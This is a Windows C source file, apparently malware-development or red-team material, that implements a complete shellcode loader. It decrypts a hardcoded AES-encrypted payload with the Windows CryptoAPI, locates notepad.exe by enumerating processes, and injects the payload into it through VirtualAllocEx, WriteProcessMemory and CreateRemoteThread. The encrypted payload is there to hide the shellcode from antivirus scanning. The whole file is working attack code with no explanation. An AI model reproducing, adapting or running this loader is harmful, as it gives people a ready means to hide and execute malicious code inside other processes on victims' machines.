#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

unsigned char key[] = { 0xd5, 0x73, 0x58, 0x7a, 0x75, 0x8e, 0x2b, 0x38, 0x5d, 0xbe, 0xa2, 0x45, 0x1f, 0x4e, 0x96, 0xdd };
unsigned char payload[] = { 0x9a, 0xe5, 0x19, 0xdf, 0xa2, 0xf7, 0xdd, 0x4b, 0x51, 0x41, 0xfc, 0xc7, 0xf4, 0xd3, 0x36, 0x2e, 0xd5, 0x04, 0x4d, 0x06, 0x95, 0xf2, 0xae, 0x68, 0x39, 0x82, 0x13, 0x1f, 0xf2, 0xdc, 0x2c, 0xa6, 0x5d, 0x4a, 0xb6, 0x96, 0x23, 0xc4, 0xc1, 0xb2, 0x83, 0x67, 0x19, 0x0d, 0xbd, 0xce, 0x63, 0x8b, 0xc3, 0x0a, 0xcb, 0xef, 0xe3, 0x07, 0xce, 0xe2, 0x41, 0x83, 0xd1, 0xfb, 0x17, 0x81, 0xf6, 0xe7, 0x48, 0x2b, 0x18, 0x9e, 0x8f, 0xd0, 0xa7, 0x23, 0x71, 0xe7, 0xdd, 0xd6, 0xcf, 0xa2, 0x0b, 0x73, 0x79, 0x9f, 0x91, 0x8b, 0x7d, 0x49, 0xcc, 0x0e, 0x74, 0xa9, 0x0c, 0xf0, 0x88, 0xd9, 0x6a, 0x00 };
unsigned int payload_len = sizeof(payload);

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


int FindTarget(const char * procname) {

	int pid = 0;
	DWORD Procs[1024], bytesReturned, NumOfProcesses;
	TCHAR szProcessName[MAX_PATH];
	
	// Get the list of process identifiers.
	if ( !EnumProcesses(Procs, sizeof(Procs), &bytesReturned) ) 
        return 0;
	
	// Calculate how many process identifiers were returned.
    NumOfProcesses = bytesReturned / sizeof(DWORD);

    for (int i = 0; i < NumOfProcesses; i++ ) {
        if (Procs[i] != 0) {
			// Get a handle to the process.
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Procs[i]);

			// and find the one we're looking for
			if (hProc != NULL) {
				HMODULE hModule;

				if (EnumProcessModules(hProc, &hModule, sizeof(hModule), &bytesReturned)) {
					GetModuleBaseName(hProc, hModule, (LPSTR) szProcessName, sizeof(szProcessName)/sizeof(TCHAR));
					if (lstrcmpiA(procname, szProcessName) == 0) {
						pid = Procs[i];
						break;
					}
				}
				
			}
			CloseHandle(hProc);
        }
    }
	
    return pid;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;

	// Decrypt payload
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}



int main() {

    printf("Architecture: %d-bit\n", (int)sizeof(void*) * 8);

    int pid = FindTarget("notepad.exe");
	printf("Notepad %s%d)\n", pid > 0 ? "found at PID: (" : "NOT FOUND (", pid);
    HANDLE hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                        FALSE, (DWORD) pid);
    if (hProc != NULL) {
        Inject(hProc, payload, payload_len);
        printf("[+] Injection complete\n");
        CloseHandle(hProc);
    }
    
    return 0;


}